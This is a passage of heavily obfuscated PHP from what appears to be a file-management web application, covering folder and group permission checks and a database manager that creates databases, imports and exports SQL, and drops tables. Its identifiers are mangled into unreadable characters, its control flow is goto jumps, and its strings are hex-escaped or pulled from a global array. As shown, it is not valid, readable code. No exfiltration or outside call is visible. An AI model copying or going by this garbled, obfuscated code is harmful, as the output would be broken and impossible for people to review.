return $d˜ôõ¶£§ã; } goto EöÈõ§öô; EöÈõ§öô: $dñÁ®’ø = Model($b–®ËÕòßØ[1239])->parentLevelArray($d˜ôõ¶£§ã[$b–®ËÕòßØ[515]]); $dñÁ®’ø = array_merge(array($d˜ôõ¶£§ã[$b–®ËÕòßØ[397]]), array_reverse($dñÁ®’ø)); $B¦Üùêõğ‡ = $this->sourceAuthSelect($dñÁ®’ø); goto Fî´¨©§İ±; Fî´¨©§İ±: $cÊÙğ¸¼ = array(); $FƒÉØ¿Á®Æ = array(); foreach ($B¦Üùêõğ‡ as $f°Ø¦Øß ë => $DØÑæƒ¥İà) { $cƒŞ‹éÆ„ = $this->authFolderOwnerUser($DØÑæƒ¥İà); $cÊÙğ¸¼[$f°Ø¦Øß ë] = $cƒŞ‹éÆ„; $FƒÉØ¿Á®Æ = array_merge($FƒÉØ¿Á®Æ, $cƒŞ‹éÆ„[$b–®ËÕòßØ[588]]); if ($cƒŞ‹éÆ„[$b–®ËÕòßØ[1933]]) { break; } } goto Eªò‰¼¡ÁÕ; FŒô÷†äğ„: $d˜ôõ¶£§ã[$b–®ËÕòßØ[408]][$b–®ËÕòßØ[1934]] = Model($b–®ËÕòßØ[507])->userListInfo($FƒÉØ¿Á®Æ); return $d˜ôõ¶£§ã; goto A‰ÙÚ”ÅŞœ; Eªò‰¼¡ÁÕ: if (count($FƒÉØ¿Á®Æ) == 0) { $FƒÉØ¿Á®Æ = $this->authFolderOwnerGroup($d˜ôõ¶£§ã[$b–®ËÕòßØ[498]]); } $FƒÉØ¿Á®Æ = array_unique($FƒÉØ¿Á®Æ); if (AuthModel::authCheckRoot($d˜ôõ¶£§ã[$b–®ËÕòßØ[408]][$b–®ËÕòßØ[409]])) { $FƒÉØ¿Á®Æ[] = USER_ID; } goto FŒô÷†äğ„; A‰ÙÚ”ÅŞœ: } private function authFolderOwnerGroup($e¤å‰º¬†ò) { $FÛó¾ªš¦ =& $_SERVER[›é¼±]; $e®Ã˜î±¼É = Model($FÛó¾ªš¦[1819])->where(array($FÛó¾ªš¦[1733] => $e¤å‰º¬†ò))->select(); $eÖÓÈ–èõ = array(); if (!$e®Ã˜î±¼É) { return $eÖÓÈ–èõ; } foreach ($e®Ã˜î±¼É as $fŒ‘éƒòã) { $Có®³ˆÃßÊ = $this->authInfo($fŒ‘éƒòã); if (AuthModel::authCheckRoot($Có®³ˆÃßÊ[$FÛó¾ªš¦[408]])) { $eÖÓÈ–èõ[] = $fŒ‘éƒòã[$FÛó¾ªš¦[1564]]; } } return $eÖÓÈ–èõ; } private function authFolderOwnerUser($CºÈæ˜– ª) { $dÍ‘“ëñƒö =& $_SERVER[›é¼±]; $EäÌÀ¦Á¿ = array(); $cã¥ÎÓøß = !1; foreach ($CºÈæ˜– ª as $EİÒ¿®šÛ) { $a”ÖÔ»…¶­ = $this->authInfo($EİÒ¿®šÛ); if ($EİÒ¿®šÛ[$dÍ‘“ëñƒö[498]] == $dÍ‘“ëñƒö[191]) { $cã¥ÎÓøß = !0; } if ($EİÒ¿®šÛ[$dÍ‘“ëñƒö[406]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($a”ÖÔ»…¶­[$dÍ‘“ëñƒö[408]])) { $EäÌÀ¦Á¿[] = $EİÒ¿®šÛ[$dÍ‘“ëñƒö[498]]; } } } return array($dÍ‘“ëñƒö[588] => $EäÌÀ¦Á¿, $dÍ‘“ëñƒö[1933] => $cã¥ÎÓøß); } public function authMake($EŒÁì¢Ò®, $d¬—¼Èõ‰ç = false) { $Aæ“¼Ä¼ë =& $_SERVER[›é¼±]; $bŠÎÍ™¾‡ = $this->authArrayCheck($EŒÁì¢Ò®, $d¬—¼Èõ‰ç); if ($bŠÎÍ™¾‡[$Aæ“¼Ä¼ë[1935]]) { $bŠÎÍ™¾‡[$Aæ“¼Ä¼ë[1935]] = $this->sourceAuthInfo($bŠÎÍ™¾‡[$Aæ“¼Ä¼ë[1935]]); } return $bŠÎÍ™¾‡; } public function authArrayCheck($AŠµé‚™Á, $e¿­ÎÈÓµ¤ = false) { goto aøİ¿ÊŞ‘; bïâà”Ş„: return $d¸É…ÍÑ¥š; goto AÂô÷Ã¯»; aøİ¿ÊŞ‘: $Däğ“ö¹¤ =& $_SERVER[›é¼±]; if (!$AŠµé‚™Á) { return array($Däğ“ö¹¤[409] => 0, $Däğ“ö¹¤[460] => !1); } $e¿­ÎÈÓµ¤ = $e¿­ÎÈÓµ¤ ? $e¿­ÎÈÓµ¤ : USER_ID; goto FŠæòÕçï; FŠæòÕçï: $A’¯…‹ŸÖí = 0; $DÏ‘×ÄŠ“ = 0; $EãàäŞğƒÆ = 0; goto cœ½à“Ç; cœ½à“Ç: $E—–«¯š±â = 0; $fç˜‚ëÂöì = 0; $E„—‘¥­¹ã = 0; goto f¨…¤åáˆ; f¨…¤åáˆ: $A›™Œ­œ£ = 1000; $aÜ·êå’ÜÂ = 0; $Båâ¬»¡ë = 0; goto EĞ´¡Ùğ„Õ; EĞ´¡Ùğ„Õ: $fÕ·­¡—–È = 0; $f…ñ”ª±¤œ = 0; $AÊ‹ïÔšâ³ = array($Däğ“ö¹¤[397] => 0); goto fçÊ´â§æ–; fçÊ´â§æ–: foreach ($AŠµé‚™Á as $AÊ‹ïÔšâ³) { $Dã¸¬Ã‹ğ˜ = $this->authInfo($AÊ‹ïÔšâ³); if (!$Dã¸¬Ã‹ğ˜) { continue; } $D«ÚÔÊõŒ = $AÊ‹ïÔšâ³[$Däğ“ö¹¤[498]]; $eºçˆ«‡µ… = intval($Dã¸¬Ã‹ğ˜[$Däğ“ö¹¤[408]]); if ($AÊ‹ïÔšâ³[$Däğ“ö¹¤[406]] == SourceModel::TYPE_USER && $D«ÚÔÊõŒ == $e¿­ÎÈÓµ¤) { $A’¯…‹ŸÖí = !0; $EãàäŞğƒÆ = $Dã¸¬Ã‹ğ˜; $DÏ‘×ÄŠ“ = $eºçˆ«‡µ…; } else { if ($AÊ‹ïÔšâ³[$Däğ“ö¹¤[406]] == SourceModel::TYPE_GROUP && $this->groupContainUser($D«ÚÔÊõŒ, $e¿­ÎÈÓµ¤)) { $E—–«¯š±â = !0; $F³ÚäÈ±İÎ = $this->groupStepToUserGroup($D«ÚÔÊõŒ, $e¿­ÎÈÓµ¤); if ($F³ÚäÈ±İÎ < $A›™Œ­œ£) { $A›™Œ­œ£ = $F³ÚäÈ±İÎ; $fç˜‚ëÂöì = $eºçˆ«‡µ…; $E„—‘¥­¹ã = $Dã¸¬Ã‹ğ˜; $aÜ·êå’ÜÂ = $D«ÚÔÊõŒ; } if ($F³ÚäÈ±İÎ == $A›™Œ­œ£ && $eºçˆ«‡µ… >= $fç˜‚ëÂöì) { $fç˜‚ëÂöì = $eºçˆ«‡µ…; $E„—‘¥­¹ã = $Dã¸¬Ã‹ğ˜; $aÜ·êå’ÜÂ = $D«ÚÔÊõŒ; } } else { if ($D«ÚÔÊõŒ == $Däğ“ö¹¤[191]) { $Båâ¬»¡ë = !0; $f…ñ”ª±¤œ = $Dã¸¬Ã‹ğ˜; $fÕ·­¡—–È = $eºçˆ«‡µ…; } } } } if ($A’¯…‹ŸÖí) { $cøÖĞí•ÂŒ = $DÏ‘×ÄŠ“; $Dã¸¬Ã‹ğ˜ = $EãàäŞğƒÆ; $cº‹›øÂŸ = LNG($Däğ“ö¹¤[1936]); } else { if ($E—–«¯š±â) { $cøÖĞí•ÂŒ = $fç˜‚ëÂöì; $Dã¸¬Ã‹ğ˜ = $E„—‘¥­¹ã; $D·Ëƒùã‚‚ = Model($Däğ“ö¹¤[516])->getInfo($aÜ·êå’ÜÂ); $cº‹›øÂŸ = $Däğ“ö¹¤[160] . $D·Ëƒùã‚‚[$Däğ“ö¹¤[520]] . $Däğ“ö¹¤[1937] . LNG($Däğ“ö¹¤[1938]); } else { if ($Båâ¬»¡ë) { $cøÖĞí•ÂŒ = $fÕ·­¡—–È; $Dã¸¬Ã‹ğ˜ = $f…ñ”ª±¤œ; $cº‹›øÂŸ = LNG($Däğ“ö¹¤[1909]); } else { $cøÖĞí•ÂŒ = 0; $Dã¸¬Ã‹ğ˜ = !1; $cº‹›øÂŸ = $Däğ“ö¹¤[33]; } } } $d¸É…ÍÑ¥š = array($Däğ“ö¹¤[1928] => intval($cøÖĞí•ÂŒ), $Däğ“ö¹¤[1912] => $Dã¸¬Ã‹ğ˜, $Däğ“ö¹¤[1929] => $cº‹›øÂŸ, $Däğ“ö¹¤[1921] => $AÊ‹ïÔšâ³[$Däğ“ö¹¤[397]]); goto bïâà”Ş„; AÂô÷Ã¯»: } private function groupContainUser($D‡Ê‡è¼ÚŠ, $Eâ©šÄ‚ = false) { return in_array($D‡Ê‡è¼ÚŠ, $this->userGroupParents($Eâ©šÄ‚)); } private function groupStepToUserGroup($DÔ§ÔÁ«­, $F¢ÓÀÌÍªĞ = false) { goto C…‹·‡£ô‹; D‘‹àÖ³Ù†: $aº´ì™‹ = $GLOBALS[$dæÄÌÔÈ[6]][$dæÄÌÔÈ[88]][$dæÄÌÔÈ[1830]] == 1; $D¯„†ã¥·É = $aº´ì™‹ ? 3 : 2; foreach ($aç–âòí­æ as $dÒÂÁ©ÙŒ„) { if ($dÒÂÁ©ÙŒ„[$dæÄÌÔÈ[1733]] == $DÔ§ÔÁ«­) { return 0; } $a™ù˜Ú‡ó¤ = explode($dæÄÌÔÈ[47], trim($dÒÂÁ©ÙŒ„[$dæÄÌÔÈ[515]], $dæÄÌÔÈ[47])); if ($a™ù˜Ú‡ó¤[0] == $dæÄÌÔÈ[191] && count($a™ù˜Ú‡ó¤) > $D¯„†ã¥·É) { $c†…¬“À¸‹ = array_reverse(array_slice($a™ù˜Ú‡ó¤, $D¯„†ã¥·É)); $böÔ¡ŠÖŠ = array_search($DÔ§ÔÁ«­, $c†…¬“À¸‹); if ($böÔ¡ŠÖŠ !== !1 && $böÔ¡ŠÖŠ + 1 <= $Cì¾Ë„¶ÙÂ) { $Cì¾Ë„¶ÙÂ = $böÔ¡ŠÖŠ + 1; } } } goto a›À’‡áõ; C…‹·‡£ô‹: $dæÄÌÔÈ =& $_SERVER[›é¼±]; $aç–âòí­æ = $this->userGroupList($F¢ÓÀÌÍªĞ); $Cì¾Ë„¶ÙÂ = 1000; goto D‘‹àÖ³Ù†; a›À’‡áõ: return $Cì¾Ë„¶ÙÂ; goto b‘«¯ì·‰; b‘«¯ì·‰: } private function userGroupList($CÒ©Ğù÷š… = false) { $b‚ì–Õëø£ =& $_SERVER[›é¼±]; static $DÂàÛ–Õ– = array(); if (isset($DÂàÛ–Õ–[$CÒ©Ğù÷š…])) { return $DÂàÛ–Õ–[$CÒ©Ğù÷š…]; } $E¸¯ğ‡ÙßÌ = Model($b‚ì–Õëø£[532])->getInfo($CÒ©Ğù÷š…); $DÂàÛ–Õ–[$CÒ©Ğù÷š…] = array_to_keyvalue($E¸¯ğ‡ÙßÌ[$b‚ì–Õëø£[1910]], $b‚ì–Õëø£[1733]); return $DÂàÛ–Õ–[$CÒ©Ğù÷š…]; } public function userGroupParents($c˜ùÙ†â­¢) { goto FæšÖ¨òòÊ; C×–’“­„æ: if (isset($c«öã‰âØ[$c˜ùÙ†â­¢])) { return $c«öã‰âØ[$c˜ùÙ†â­¢]; } $EßŸˆ˜× = $this->userGroupList($c˜ùÙ†â­¢); $BÉ‘õ£Ä’ø = array(); goto BäË…Ã†ïº; FæšÖ¨òòÊ: $f‚’ÑÙ‡ñ« =& $_SERVER[›é¼±]; static $c«öã‰âØ = array(); $c˜ùÙ†â­¢ = $c˜ùÙ†â­¢ ? $c˜ùÙ†â­¢ : USER_ID; goto C×–’“­„æ; BäË…Ã†ïº: $eâïœ½Úøï = $GLOBALS[$f‚’ÑÙ‡ñ«[6]][$f‚’ÑÙ‡ñ«[88]][$f‚’ÑÙ‡ñ«[1830]] == 1; $e„é‰ğÀ› = $eâïœ½Úøï ? 3 : 2; foreach ($EßŸˆ˜× as $f¡‡ğâ­¾©) { $b‚åí¦×®Â = array($f¡‡ğâ­¾©[$f‚’ÑÙ‡ñ«[1733]]); $AšÎ„³Õæ’ = explode($f‚’ÑÙ‡ñ«[47], trim($f¡‡ğâ­¾©[$f‚’ÑÙ‡ñ«[515]], $f‚’ÑÙ‡ñ«[47])); if ($AšÎ„³Õæ’[0] == $f‚’ÑÙ‡ñ«[191] && count($AšÎ„³Õæ’) > $e„é‰ğÀ›) { $d«‚Ôôó–È = array_slice($AšÎ„³Õæ’, $e„é‰ğÀ›); $b‚åí¦×®Â = array_merge($b‚åí¦×®Â, array_reverse($d«‚Ôôó–È)); } $BÉ‘õ£Ä’ø = array_merge($BÉ‘õ£Ä’ø, $b‚åí¦×®Â); } goto dĞç²¶Ä‚; dĞç²¶Ä‚: $c«öã‰âØ[$c˜ùÙ†â­¢] = array_unique($BÉ‘õ£Ä’ø); return $c«öã‰âØ[$c˜ùÙ†â­¢]; goto E”Ğ­ÊÁ –; E”Ğ­ÊÁ –: } public function authTargetInfoMake($B—×¢”Æ‹Ì) { goto c÷­ƒ‹³Â¼; eóÑ¢©é—Ñ: return array($Bˆåï°ÄÚ[1940] => $Aˆ‰µ÷á™, $Bˆåï°ÄÚ[1941] => $aÏóï»ŞÂˆ); goto EÏ ½›É®‰; FÂÚŞØë: foreach ($B—×¢”Æ‹Ì as $c«˜Ğœ¡Ï) { if ($c«˜Ğœ¡Ï[$Bˆåï°ÄÚ[406]] == SourceModel::TYPE_USER) { $Aˆ‰µ÷á™[] = intval($c«˜Ğœ¡Ï[$Bˆåï°ÄÚ[498]]); } else { if ($c«˜Ğœ¡Ï[$Bˆåï°ÄÚ[406]] == SourceModel::TYPE_GROUP) { $aÏóï»ŞÂˆ[] = intval($c«˜Ğœ¡Ï[$Bˆåï°ÄÚ[498]]); } } } if ($Aˆ‰µ÷á™) { $Aˆ‰µ÷á™ = Model($Bˆåï°ÄÚ[507])->userListInfo($Aˆ‰µ÷á™); } if ($aÏóï»ŞÂˆ) { $CòÜ¡öâß´ = array($Bˆåï°ÄÚ[1817] => array($Bˆåï°ÄÚ[413], $aÏóï»ŞÂˆ)); $aÏóï»ŞÂˆ = Model($Bˆåï°ÄÚ[516])->field($Bˆåï°ÄÚ[1939])->where($CòÜ¡öâß´)->select(); $aÏóï»ŞÂˆ = array_to_keyvalue($aÏóï»ŞÂˆ, $Bˆåï°ÄÚ[1733]); } goto eóÑ¢©é—Ñ; c÷­ƒ‹³Â¼: $Bˆåï°ÄÚ =& $_SERVER[›é¼±]; $Aˆ‰µ÷á™ = array(); $aÏóï»ŞÂˆ = array(); goto FÂÚŞØë; EÏ ½›É®‰: } public function authInfo($aÚÖˆîéÏ§) { $Eà²Ê¯Ÿ‰İ =& $_SERVER[›é¼±]; if ($aÚÖˆîéÏ§[$Eà²Ê¯Ÿ‰İ[1833]]) { $cç²‹’´ƒ‚ = Model($Eà²Ê¯Ÿ‰İ[501])->listData($aÚÖˆîéÏ§[$Eà²Ê¯Ÿ‰İ[1833]]); if (!$cç²‹’´ƒ‚) { return !1; $c©“„ˆ‹ = Model($Eà²Ê¯Ÿ‰İ[501])->listData(); $Cİ’§Ú¤™ = array_filter_by_field($c©“„ˆ‹, $Eà²Ê¯Ÿ‰İ[408], $Eà²Ê¯Ÿ‰İ[191]); return $Cİ’§Ú¤™; } $ağ¬Ší¯‘ = array_field_key($cç²‹’´ƒ‚, array($Eà²Ê¯Ÿ‰İ[395], $Eà²Ê¯Ÿ‰İ[28], $Eà²Ê¯Ÿ‰İ[408], $Eà²Ê¯Ÿ‰İ[1755], $Eà²Ê¯Ÿ‰İ[1756])); $ağ¬Ší¯‘[$Eà²Ê¯Ÿ‰İ[1942]] = $aÚÖˆîéÏ§; return $ağ¬Ší¯‘; } else { return array($Eà²Ê¯Ÿ‰İ[414] => 0, $Eà²Ê¯Ÿ‰İ[1739] => $aÚÖˆîéÏ§[$Eà²Ê¯Ÿ‰İ[1887]], $Eà²Ê¯Ÿ‰İ[415] => $Eà²Ê¯Ÿ‰İ[33], $Eà²Ê¯Ÿ‰İ[1755] => $Eà²Ê¯Ÿ‰İ[1943]); } } } goto c×Â÷Ë¢±º; C¸ˆù•Õ¼ : class DbManage { function __construct($B±İ·‘äß, $Eê©è—Ã›˜ = '') { $this->database = $B±İ·‘äß; $this->type = $Eê©è—Ã›˜; } public function model($bæåöó£à¾ = '') { return new ModelBase($bæåöó£à¾, $_SERVER[›é¼±][33], $this->database); } public function db($DŠé°Ê½ÅÇ = false) { goto E‘ÆÒ›íÓ‘; Dï®ËÏŠâ¼: if (!$A–™´òª‰ğ) { $D‘ÃãòøÃ->execute("\x63\x72\145\141\164\145\x20\144\x61\x74\141\x62\x61\163\x65\x20\x60{$d—õ´Ÿ­¡Ê}\140"); } $eÂÉ†·Ÿ¢ [$b¤ÌŸÕƒ‹†[964]] = $d—õ´Ÿ­¡Ê; if ($eÂÉ†·Ÿ¢ [$b¤ÌŸÕƒ‹†[791]] == $b¤ÌŸÕƒ‹†[792]) { $eÂÉ†·Ÿ¢ [$b¤ÌŸÕƒ‹†[793]] .= $b¤ÌŸÕƒ‹†[1051] . $d—õ´Ÿ­¡Ê; } goto DóŠ÷Ğ¤†Ú; C¬Ì£Ó†½: $this->database = $eÂÉ†·Ÿ¢ ; $D‘ÃãòøÃ = $this->model()->db(); try { $A–™´òª‰ğ = $D‘ÃãòøÃ->execute("\x73\x68\157\x77\40\144\x61\x74\141\142\141\163\x65\x73\40\154\x69\x6b\x65\x20\47{$d—õ´Ÿ­¡Ê}\47"); } catch (Exception $c«™¹‹¢ªæ) { } goto Dï®ËÏŠâ¼; DóŠ÷Ğ¤†Ú: $this->database = $eÂÉ†·Ÿ¢ ; $D‘ÃãòøÃ->execute("\x75\x73\x65\x20\140{$d—õ´Ÿ­¡Ê}\x60"); return $D‘ÃãòøÃ; goto dÁ²Íì¬Úƒ; E‘ÆÒ›íÓ‘: $b¤ÌŸÕƒ‹† =& $_SERVER[›é¼±]; $eÂÉ†·Ÿ¢  = array_change_key_case($this->database); if ($this->type == $b¤ÌŸÕƒ‹†[9] || !$DŠé°Ê½ÅÇ) { return $this->model()->db(); } goto bğÇ½÷é‘; bğÇ½÷é‘: $d—õ´Ÿ­¡Ê = $eÂÉ†·Ÿ¢ [$b¤ÌŸÕƒ‹†[964]]; $eÂÉ†·Ÿ¢ [$b¤ÌŸÕƒ‹†[964]] = $b¤ÌŸÕƒ‹†[33]; if ($eÂÉ†·Ÿ¢ [$b¤ÌŸÕƒ‹†[791]] == $b¤ÌŸÕƒ‹†[792]) { $a–Ì‰é¤–£ = $eÂÉ†·Ÿ¢ [$b¤ÌŸÕƒ‹†[793]]; $eÂÉ†·Ÿ¢ [$b¤ÌŸÕƒ‹†[793]] = substr($a–Ì‰é¤–£, 0, strrpos($a–Ì‰é¤–£, $b¤ÌŸÕƒ‹†[1051])); } goto C¬Ì£Ó†½; dÁ²Íì¬Úƒ: } public function createTable($A‘Ñµˆé·Á, $bƒÁ‡óŞô’ = null) { $d´´ÓÑšÁ =& $_SERVER[›é¼±]; if (!IO::exist($A‘Ñµˆé·Á)) { ActionCall($d´´ÓÑšÁ[1052], !0, 0); show_json(LNG($d´´ÓÑšÁ[1053]), !1); } $b£Â­ŒÁ® = sqlSplit(IO::getContent($A‘Ñµˆé·Á)); foreach ($b£Â­ŒÁ® as $d”¥ßÄÓ) { if ($bƒÁ‡óŞô’) { $FŠƒ¦ÌØÖ = stripos($d”¥ßÄÓ, $d´´ÓÑšÁ[1054]) === 0; if ($FŠƒ¦ÌØÖ) { $bƒÁ‡óŞô’->task[$d´´ÓÑšÁ[1055]] += 1; } } $this->model()->db()->execute($d”¥ßÄÓ); if ($bƒÁ‡óŞô’ && $FŠƒ¦ÌØÖ) { preg_match($d´´ÓÑšÁ[1056], $d”¥ßÄÓ, $A¶É™ØƒÙ); $bƒÁ‡óŞô’->task[$d´´ÓÑšÁ[1057]] = $A¶É™ØƒÙ[1]; $bƒÁ‡óŞô’->update(1); } } $this->taskToCache($bƒÁ‡óŞô’); } public function insertTable($b¹øé«”Å®, $AÃ¸‘ø÷˜‰ = null) { $EÓÂ¯­ =& $_SERVER[›é¼±]; $aäÍ«­ã»‚ = $this->model()->db(); $F‡£¯¯‡à¢ = $bÖ÷Ğµí­º ? array($bÖ÷Ğµí­º) : $aäÍ«­ã»‚->getTables(); foreach ($b¹øé«”Å® as $D®«ñ·…ì·) { $bÖ÷Ğµí­º = basename($D®«ñ·…ì·, $EÓÂ¯­[781]); if (!in_array($bÖ÷Ğµí­º, $F‡£¯¯‡à¢)) { continue; } if ($AÃ¸‘ø÷˜‰) { $AÃ¸‘ø÷˜‰->task[$EÓÂ¯­[1057]] = $bÖ÷Ğµí­º; } if (get_filesize($D®«ñ·…ì·) == 0) { continue; } $BÈ×‹ ´ = $this->sqlToDb($D®«ñ·…ì·, $AÃ¸‘ø÷˜‰); if (!$BÈ×‹ ´) { ActionCall($EÓÂ¯­[1052], !0, 0); show_json(LNG($EÓÂ¯­[1058]) . "\x5b{$bÖ÷Ğµí­º}\x5d", !1); } } $this->taskToCache($AÃ¸‘ø÷˜‰); } public function sqlFromDb($eÍéÑ‡›ºÃ, $fòñæÇëœ, $d®·÷á¶ìâ = null, $EÅ÷ºñŒÏË = null) { goto b©È×ÙĞ§Ò; C•†®Ùæ¢…: $fñ“¤Ÿó¡á = $FÛß¾çÄÑà->getPk(); $AŠ•®í¡˜ = $FÛß¾çÄÑà->getDbFields(); do { $B’»ÈêñÍÉ = array($fñ“¤Ÿó¡á => array($_SERVER[›é¼±][1006], $Dùªæ‹ìŞ)); $cïßØó±°´ = $FÛß¾çÄÑà->where($B’»ÈêñÍÉ)->field($AŠ•®í¡˜)->order($fñ“¤Ÿó¡á . $_SERVER[›é¼±][1060])->limit($D‡§”Õ®Ÿ)->select(); $cïßØó±°´ = !empty($cïßØó±°´) ? $cïßØó±°´ : array(); if (!($Eõêê×‰¡Ë = count($cïßØó±°´))) { break; } $FšôÆ†çÂï = end($cïßØó±°´); $Dùªæ‹ìŞ = $FšôÆ†çÂï[$fñ“¤Ÿó¡á]; $cÏ†ˆ¡Œ˜¨ = array(); foreach ($cïßØó±°´ as $bæª’ø‡‹¯) { if ($eÍéÑ‡›ºÃ == $_SERVER[›é¼±][1061] && $bæª’ø‡‹¯[$_SERVER[›é¼±][29]] == $_SERVER[›é¼±][1062]) { $aÈˆ±ĞØ˜× = json_decode($bæª’ø‡‹¯[$_SERVER[›é¼±][372]], !0); if ($aÈˆ±ĞØ˜×[$_SERVER[›é¼±][28]] == date($_SERVER[›é¼±][746]) && !$aÈˆ±ĞØ˜×[$_SERVER[›é¼±][745]]) { continue; } } if ($EÅ÷ºñŒÏË) { $bæª’ø‡‹¯[$_SERVER[›é¼±][76]] = "\173\x69\157\72{$EÅ÷ºñŒÏË}\175" . substr($bæª’ø‡‹¯[$_SERVER[›é¼±][76]], strlen("\x7b\x69\x6f\x3a{$bæª’ø‡‹¯[$_SERVER[›é¼±][819]]}\x7d")); $bæª’ø‡‹¯[$_SERVER[›é¼±][819]] = $EÅ÷ºñŒÏË; } $cÏ†ˆ¡Œ˜¨[] = $_SERVER[›é¼±][1063] . $this->sqlEncode($bæª’ø‡‹¯) . $_SERVER[›é¼±][1064]; } $A£ï­õ´« = "\x49\116\123\105\x52\x54\x20\x49\x4e\x54\117\x20\140{$eÍéÑ‡›ºÃ}\x60\x20\x28\140" . implode($_SERVER[›é¼±][1065], $AŠ•®í¡˜) . $_SERVER[›é¼±][1066]; fwrite($Dá“Ø‘¡À, $A£ï­õ´« . implode($_SERVER[›é¼±][1067], $cÏ†ˆ¡Œ˜¨) . $_SERVER[›é¼±][68] . PHP_EOL); $E†ì“ØŠ…ì += $Eõêê×‰¡Ë; if ($d®·÷á¶ìâ) { $d®·÷á¶ìâ->update($Eõêê×‰¡Ë); } } while ($D‡§”Õ®Ÿ == $Eõêê×‰¡Ë); goto F„ÒÒĞ‚š; E£í‚Ôİè­: $Dùªæ‹ìŞ = 0; $D‡§”Õ®Ÿ = 10000; $Dá“Ø‘¡À = fopen($fòñæÇëœ, $_SERVER[›é¼±][1059]); goto C•†®Ùæ¢…; F„ÒÒĞ‚š: fclose($Dá“Ø‘¡À); return $E†ì“ØŠ…ì; goto dŒ‹Ê Ôò¼; b©È×ÙĞ§Ò: if ($d®·÷á¶ìâ) { $d®·÷á¶ìâ->task[$_SERVER[›é¼±][1057]] = $eÍéÑ‡›ºÃ; } $FÛß¾çÄÑà = $this->model($eÍéÑ‡›ºÃ); $E†ì“ØŠ…ì = 0; goto E£í‚Ôİè­; dŒ‹Ê Ôò¼: } public function sqlToDb($F¡ ƒ×¥, $D’¥ÕîŠ÷‚ = null) { goto fò÷ÄŞé‡Á; e›ƒŠéª¹¿: while (!feof($cª½¸—íÛ”)) { $a–§Íç¸›Ó = trim(fgets($cª½¸—íÛ”)); if (!$a–§Íç¸›Ó) { continue; } $dàœË¿õ† = $this->sqlDecode($a–§Íç¸›Ó, $this->type); if (stripos($dàœË¿õ†, $F”ğ ­“[353]) === 0) { if (!$cºó¾¾³¹ù) { $cºó¾¾³¹ù = $dàœË¿õ† . $F”ğ ­“[50]; } continue; } if ($D’¥ÕîŠ÷‚) { $D’¥ÕîŠ÷‚->task[$F”ğ ­“[1055]] += 1; } $d×˜âì‹ã´++; $D«Ö»îªİÈ[] = rtrim(rtrim(trim($dàœË¿õ†), $F”ğ ­“[47]), $F”ğ ­“[68]); $Cªƒ©Ø‹†‡ = null; $Dµ¸ôè‹å® = strlen($dàœË¿õ†); $f¬¨ÍÈÏ‰À += $Dµ¸ôè‹å®; if ($f¬¨ÍÈÏ‰À >= ($c‹óåËØôİ == 500 ? $f±¨·›ªõ : $d«ô§óÜ‰)) { $Cªƒ©Ø‹†‡ = array_pop($D«Ö»îªİÈ); if ($d×˜âì‹ã´ > 1) { $d×˜âì‹ã´--; } } if ($d×˜âì‹ã´ >= $c‹óåËØôİ || $Cªƒ©Ø‹†‡) { goto CŠ«ïÙ¦ê¤; Aâ¨Ï¸œ‘Ë: $D«Ö»îªİÈ = array(); $d×˜âì‹ã´ = 0; $f¬¨ÍÈÏ‰À = 0; goto C·½Ñ¶ª; C·½Ñ¶ª: if ($Cªƒ©Ø‹†‡) { $D«Ö»îªİÈ = array($Cªƒ©Ø‹†‡); $d×˜âì‹ã´ = 1; $f¬¨ÍÈÏ‰À = $Dµ¸ôè‹å®; } goto côñÂİåªî; CŠ«ïÙ¦ê¤: $dàœË¿õ† = $cºó¾¾³¹ù . implode($F”ğ ­“[47], $D«Ö»îªİÈ); if (!$A›„ßÖ°ŞÁ->execute($dàœË¿õ†)) { return !1; } if ($D’¥ÕîŠ÷‚) { $D’¥ÕîŠ÷‚->update($d×˜âì‹ã´); } goto Aâ¨Ï¸œ‘Ë; côñÂİåªî: } } fclose($cª½¸—íÛ”); if (!empty($D«Ö»îªİÈ)) { $dàœË¿õ† = $cºó¾¾³¹ù . implode($F”ğ ­“[47], $D«Ö»îªİÈ); if (!$A›„ßÖ°ŞÁ->execute($dàœË¿õ†)) { return !1; } if ($D’¥ÕîŠ÷‚) { $D’¥ÕîŠ÷‚->update($d×˜âì‹ã´); } } goto c“Â¬ õÕ; dÏºÁÚ‚‡ª: if (!$cª½¸—íÛ”) { return !1; } $d×˜âì‹ã´ = 0; $cºó¾¾³¹ù = $F”ğ ­“[33]; goto C—¸À±°ãº; CÌœ¿äîÖ†: $f¬¨ÍÈÏ‰À = 0; $f±¨·›ªõ = 4194304 - 104858; $d«ô§óÜ‰ = 1000000 - 104858; goto e›ƒŠéª¹¿; fò÷ÄŞé‡Á: $F”ğ ­“ =& $_SERVER[›é¼±]; $A›„ßÖ°ŞÁ = $this->model()->db(); $cª½¸—íÛ” = @fopen($F¡ ƒ×¥, $F”ğ ­“[1068]); goto dÏºÁÚ‚‡ª; c“Â¬ õÕ: return !0; goto aôÓïÏÊ’; C—¸À±°ãº: $D«Ö»îªİÈ = array(); $c‹óåËØôİ = $this->type == $F”ğ ­“[9] ? 500 : 2000; $a©‡¿İ«¤· = basename($F¡ ƒ×¥, $F”ğ ­“[781]); goto CÌœ¿äîÖ†; aôÓïÏÊ’: } public function dropTable($fÑ¿øÊµ = null) { $a¼Î¦ôà×” = $this->model()->db(); $fˆ‡§İù¶¹ = $fÑ¿øÊµ ? array($fÑ¿øÊµ) : $a¼Î¦ôà×”->getTables(); if (!$fˆ‡§İù¶¹) { return; } foreach ($fˆ‡§İù¶¹ as $fÑ¿øÊµ) { if ($fÑ¿øÊµ) { $fÑ¿øÊµ = strtolower($fÑ¿øÊµ); } else { continue; } $a¼Î¦ôà×”->execute("\x64\162\157\160\40\x74\141\x62\x6c\145\40\x69\146\40\145\170\x69\x73\x74\x73\x20\x60{$fÑ¿øÊµ}\140"); } } private function taskToCache($Dî÷¬•÷Â = null) { $dá¥Áõ·‘ =& $_SERVER[›é¼±]; if (!$Dî÷¬•÷Â) { return; } $F¾º·÷£™´ = array($dá¥Áõ·‘[1057] => $Dî÷¬•÷Â->task[$dá¥Áõ·‘[1057]], $dá¥Áõ·‘[1055] => $Dî÷¬•÷Â->task[$dá¥Áõ·‘[1055]], $dá¥Áõ·‘[1069] => $Dî÷¬•÷Â->task[$dá¥Áõ·‘[1069]]); if ($F¾º·÷£™´[$dá¥Áõ·‘[1055]] == $F¾º·÷£™´[$dá¥Áõ·‘[1069]]) { $F¾º·÷£™´[$dá¥Áõ·‘[755]] = 1; } Cache::set($dá¥Áõ·‘[1070] . $Dî÷¬•÷Â->task[$dá¥Áõ·‘[395]], $F¾º·÷£™´); $Dî÷¬•÷Â->end(); } private function 